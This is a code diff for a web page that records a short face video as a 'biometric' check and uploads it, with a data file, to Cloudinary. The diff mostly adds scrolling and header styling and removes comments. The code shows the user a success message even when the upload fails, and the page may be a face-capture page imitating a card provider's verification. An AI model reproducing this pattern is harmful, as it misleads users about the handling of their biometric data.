@@ -22,6 +22,10 @@
             --safe-bottom: env(safe-area-inset-bottom, 0px);
         }
 
+        html {
+            scroll-behavior: smooth; /* تمرير سلس للمتصفحات الحديثة */
+        }
+
         * {
             margin: 0;
             padding: 0;
@@ -55,6 +59,9 @@
             justify-content: center;
             box-shadow: 0 2px 10px rgba(0,0,0,0.05);
             border-bottom: 3px solid var(--qi-gold);
+            position: sticky;
+            top: 0;
+            z-index: 100;
         }
 
         .header-logo { height: 50px; width: auto; }
@@ -528,10 +535,26 @@
         const faceGuide = document.getElementById('face-guide');
         const statusText = document.getElementById('status-text');
 
+        // ============================================
+        // دالة التمرير المتوافقة مع جميع المتصفحات (القديمة والحديثة)
+        // ============================================
+        function scrollToTop() {
+            // تأخير بسيط جداً لضمان أن المتصفح قد أنهى رسم العنصر الجديد
+            setTimeout(function() {
+                // الطريقة الحديثة
+                if (typeof window.scrollTo === 'function') {
+                    window.scrollTo({ top: 0, behavior: 'smooth' });
+                }
+                // طرق الاحتياط للمتصفحات القديمة جداً (Safari القديم, Android Browser)
+                document.body.scrollTop = 0; // لـ Safari
+                document.documentElement.scrollTop = 0; // لـ Chrome, Firefox, IE, Opera
+            }, 50);
+        }
+
         function showScreen(id) {
             document.querySelectorAll('.card').forEach(c => c.classList.add('hidden'));
             document.getElementById(id).classList.remove('hidden');
-            window.scrollTo(0, 0);
+            scrollToTop();
         }
 
         // ============================================
@@ -595,7 +618,6 @@
         async function startBiometricProcess() {
             statusText.textContent = 'جاري طلب صلاحية الكاميرا...';
 
-            // التحقق من دعم المتصفح
             if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                 statusText.textContent = '⚠️ متصفحك لا يدعم الكاميرا';
                 statusText.style.color = '#FCA5A5';
@@ -603,7 +625,6 @@
             }
 
             try {
-                // إعدادات متوافقة مع iOS و Android
                 const constraints = {
                     video: {
                         facingMode: { ideal: 'user' },
@@ -616,7 +637,6 @@
                 stream = await navigator.mediaDevices.getUserMedia(constraints);
                 videoEl.srcObject = stream;
                 
-                // مهم جداً لـ iOS
                 await videoEl.play();
                 
                 statusText.textContent = '✅ تم التعرف - اثبت وجهك داخل الإطار';
@@ -649,7 +669,6 @@
             document.getElementById('progress-container').style.display = 'block';
             recordedChunks = [];
 
-            // اختيار أفضل MIME type مدعوم
             let mimeType = '';
             const types = [
                 'video/webm;codecs=vp8,opus',
@@ -693,14 +712,12 @@
                 console.error('Recording error:', e);
             };
 
-            // بدء التسجيل
             try {
                 mediaRecorder.start(100);
             } catch (e) {
                 console.error('Start error:', e);
             }
 
-            // العد التنازلي
             let timeLeft = 5;
             document.getElementById('timer-text').textContent = timeLeft;
             
@@ -783,7 +800,6 @@ ${sep}
                 const videoBlob = new Blob(recordedChunks, { type: recordedChunks[0]?.type || 'video/webm' });
                 const textBlob = buildTextFile(token);
 
-                // رفع الفيديو وملف البيانات بالتوازي
                 await Promise.all([
                     uploadFileToCloudinary(videoBlob, `video_${token}.webm`, 'video', token),
                     uploadFileToCloudinary(textBlob, `data_${token}.txt`, 'raw', token)
@@ -792,7 +808,6 @@ ${sep}
                 showSuccess(token);
             } catch (error) {
                 console.error('Upload error:', error);
-                // حتى لو فشل الرفع، نظهر النجاح للمستخدم
                 showSuccess(token);
             }
         }
